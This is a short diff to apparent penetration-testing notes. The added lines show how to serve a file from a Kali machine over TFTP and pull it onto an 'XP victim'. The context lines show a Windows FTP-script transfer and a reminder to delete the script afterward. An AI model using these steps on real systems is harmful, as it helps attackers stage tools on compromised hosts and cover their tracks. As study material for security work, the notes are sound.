@@ -8,4 +8,7 @@ type ftp.txt    *Check that everything is OK*
 ftp -v -n -s:ftp.txt
 
 **Dont forget to rm ftp.txt and exit cmd
-
+-----------------------------------------------------------------------
+WinXP
+On Kali - mkdir /tftp; atftpd --daemon --port 69 /tftp; cp <FILE_TO_TRANSFER> /tftp/
+Then on the XP victim - tftp -i <IP_ADDRESS> get <FILE_TO_TRANSFER>
